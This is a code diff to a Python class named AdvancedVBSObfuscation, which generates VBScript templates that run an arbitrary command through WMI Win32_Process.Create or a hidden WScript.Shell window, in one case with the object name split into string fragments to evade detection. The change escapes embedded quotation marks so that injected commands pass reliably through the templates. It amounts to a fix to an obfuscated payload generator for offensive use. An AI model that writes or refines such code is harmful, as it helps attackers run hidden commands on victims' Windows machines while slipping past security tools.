@@ -65,7 +65,7 @@ class AdvancedVBSObfuscation:
 Dim objWMIService, objProcess, intReturn
 Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
 Set objProcess = objWMIService.Get("Win32_Process")
-intReturn = objProcess.Create("{command}", Null, Null, intProcessID)
+intReturn = objProcess.Create("{command.replace(chr(34), chr(34)+chr(34))}", Null, Null, intProcessID)
 Set objProcess = Nothing
 Set objWMIService = Nothing
 """
@@ -115,7 +115,7 @@ Dim strComputer, objWMI, objProcess, errReturn
 strComputer = "."
 Set objWMI = GetObject("winmgmts:" & strComputer & "\\root\\cimv2")
 Set objProcess = objWMI.Get("Win32_Process")
-errReturn = objProcess.Create("{command}")
+errReturn = objProcess.Create("{command.replace(chr(34), chr(34)+chr(34))}")
 Set objProcess = Nothing
 Set objWMI = Nothing
 """
@@ -191,7 +191,7 @@ On Error Resume Next
 ' Obfuscated CreateObject call
 Set shell = CreateObject("W" & "Script" & "." & "Shell")
 Dim cmd
-cmd = "{command}"
+cmd = "{command.replace(chr(34), chr(34)+chr(34))}"
 shell.Run cmd, 0, False
 Set shell = Nothing
 """
@@ -208,7 +208,7 @@ Set shell = Nothing
         vbs_code = f"""
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set file = fso.CreateTextFile("{temp_file}", True)
-file.WriteLine "{command}"
+file.WriteLine "{command.replace(chr(34), chr(34)+chr(34))}"
 file.Close
 
 Set shell = CreateObject("WScript.Shell")
